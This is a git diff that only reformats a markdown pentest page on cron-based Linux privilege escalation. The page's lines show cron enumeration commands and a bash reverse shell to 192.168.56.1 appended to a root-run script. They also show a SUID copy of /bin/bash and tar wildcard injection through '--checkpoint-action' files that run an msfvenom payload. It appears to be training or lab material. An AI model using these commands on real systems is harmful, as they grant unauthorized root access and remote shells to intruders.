@@ -1,12 +1,12 @@
 # cron/crontab abuse
 
-## Crontab <a href="top" id="top"></a>
+## Crontab <a href="#top" id="top"></a>
 
 #### cron or crontab is a unix job scheduler tool. a best friend for system administrators and when misconfigured, the best chance for an attacker to gain root access.  cron instructions usually consist of simple commands like a regular rsync command or a log cleaner one-liner script.but it gets real interesting when we find a path for a script to run as sudoer or root user in the crontab entries.if we are lucky enough to have an insecure file permission we can use it to escalate our privileges.  In order to leverage insecure file permissions, we must locate an executable file that not only allows us write access but also runs at an elevated privilege level. On a Linux system, the cron time based job scheduler is a prime target, as system-level scheduled jobs are executed with root user privileges and system administrators often create scripts for cron jobs with insecure permissions.
 
 
 
-#### for example look for cron jobs with the following commands:   `grep "CRON" /var/log/cron.log >>> works best for unprivileged users` ` crontab -l` ` ls -alh /var/spool/cron` ` ls -al /etc/ | grep cron` ` ls -al /etc/cron*` ` cat /etc/cron*` ` cat /etc/at.allow` ` cat /etc/at.deny` ` cat /etc/cron.allow` ` cat /etc/cron.deny` ` cat /etc/crontab` ` cat /etc/anacrontab` ` cat /var/spool/cron/crontabs/root`
+#### for example look for cron jobs with the following commands:   `grep "CRON" /var/log/cron.log >>> works best for unprivileged users`  `crontab -l`  `ls -alh /var/spool/cron`  `ls -al /etc/ | grep cron`  `ls -al /etc/cron*`  `cat /etc/cron*`  `cat /etc/at.allow`  `cat /etc/at.deny`  `cat /etc/cron.allow`  `cat /etc/cron.deny`  `cat /etc/crontab`  `cat /etc/anacrontab`  `cat /var/spool/cron/crontabs/root`
 
 ![](../../../.gitbook/assets/cron1.png)
 
@@ -20,7 +20,7 @@ greate, we have read/write access to a file that is executed by root user every 
 
 
 
-#### `` ` echo "bash -i >& /dev/tcp/192.168.56.1/8080 0>&1" >> /usr/local/bin/overwrite.sh` ``
+#### ``  `echo "bash -i >& /dev/tcp/192.168.56.1/8080 0>&1" >> /usr/local/bin/overwrite.sh` ``
 
 ![](../../../.gitbook/assets/cron3.png)
 
@@ -45,7 +45,7 @@ so we have full access to our home path which is also the PATH variable in cront
 
 we can also make a copy of /bin/bash to have a root shell without spawning a new tty:
 
-#### `` ` nano /home/user/overwrite.sh` ` #!/bin/bash` ` cp /bin/bash /tmp/rootbash` ` chmod +s /tmp/rootbash`
+#### ``  `nano /home/user/overwrite.sh`  `#!/bin/bash`  `cp /bin/bash /tmp/rootbash`  `chmod +s /tmp/rootbash`
 
 #### &#x20; Once the /tmp/rootbash file is created, execute it (with -p to preserve the effective UID) to gain a root shell: 
 
@@ -62,7 +62,7 @@ we can also make a copy of /bin/bash to have a root shell without spawning a new
 \
 
 
-#### &#x20;`ls *` ` touch ./-l` ` ls *`
+#### &#x20;`ls *`  `touch ./-l`  `ls *`
 
 
 
@@ -90,7 +90,7 @@ View the contents of the /usr/local/bin/compress.sh file:\
 \
 
 
-#### &#x20;`$ cat /usr/local/bin/compress.sh` ` #!/bin/sh` ` cd /home/user` ` tar czf /tmp/backup.tar.gz *` `` ``
+#### &#x20;`$ cat /usr/local/bin/compress.sh`  `#!/bin/sh`  `cd /home/user`  `tar czf /tmp/backup.tar.gz *` `` ``
 
 &#x20;Note that the tar command is run with a wildcard in the /home/user directory.\
 &#x20;GTFOBins shows that tar has command line options. which can be used to run other commands as part of a checkpoint feature.
@@ -108,7 +108,7 @@ Use msfvenom to create a reverse shell ELF payload:\
 \
 
 
-#### &#x20;`touch /home/user/--checkpoint=1` ` touch /home/user/--checkpoint-action=exec=shell.elf` `` ``
+#### &#x20;`touch /home/user/--checkpoint=1`  `touch /home/user/--checkpoint-action=exec=shell.elf` `` ``
 
 &#x20;Run a netcat listener on your local machine and wait for the cron job to run. A reverse shell running as the root user should be caught.
 
